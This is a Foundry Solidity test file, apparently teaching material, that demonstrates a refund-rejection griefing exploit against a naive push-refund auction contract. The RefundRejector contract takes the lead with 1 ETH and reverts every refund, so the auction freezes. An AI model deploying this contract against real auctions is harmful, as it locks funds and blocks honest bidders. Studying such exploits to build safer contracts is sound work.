// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import {Test} from "forge-std/Test.sol";
import {NaiveAuction} from "../../src/ch05/NaiveAuction.sol";

/// @notice A bidder that refuses refunds. Once it holds the lead, every attempt
///         to outbid it reverts on the push refund, so it wins forever.
contract RefundRejector {
    NaiveAuction public immutable auction;

    constructor(NaiveAuction _auction) {
        auction = _auction;
    }

    function placeBid() external payable {
        auction.bid{value: msg.value}();
    }

    // The whole exploit: reject the refund.
    receive() external payable {
        revert("I never give it back");
    }
}

/// @notice Demonstrates the economic capture. The griefer bids a mere 1 ETH and
///         no honest bidder — however much they offer — can take the lead.
contract AuctionGriefTest is Test {
    NaiveAuction internal auction;

    address internal honest = address(0xB0B);

    function setUp() public {
        auction = new NaiveAuction(1 days);
    }

    function test_baseline_honestOutbidWorks() public {
        // Two honest EOAs: outbidding refunds the previous bidder fine.
        address a = address(0xA);
        address b = address(0xB);
        vm.deal(a, 1 ether);
        vm.deal(b, 2 ether);

        vm.prank(a);
        auction.bid{value: 1 ether}();
        vm.prank(b);
        auction.bid{value: 2 ether}();

        assertEq(auction.highestBidder(), b, "honest outbid works normally");
        assertEq(a.balance, 1 ether, "previous bidder was refunded");
    }

    /// The exploit: a griefer contract takes the lead with 1 ETH, and a 100 ETH
    /// honest bid cannot displace it because the refund to the griefer reverts.
    function test_exploit_griefingFreezesAuction() public {
        RefundRejector griefer = new RefundRejector(auction);
        vm.deal(address(griefer), 1 ether);
        griefer.placeBid{value: 1 ether}();

        assertEq(auction.highestBidder(), address(griefer), "griefer leads with 1 ETH");

        // An honest whale tries to bid 100 ETH and cannot.
        vm.deal(honest, 100 ether);
        vm.prank(honest);
        vm.expectRevert(bytes("refund failed"));
        auction.bid{value: 100 ether}();

        // The auction is frozen: griefer still leads, with a 1 ETH bid.
        assertEq(auction.highestBidder(), address(griefer), "griefer still leads");
        assertEq(auction.highestBid(), 1 ether, "with a trivial bid nobody can beat");
    }
}
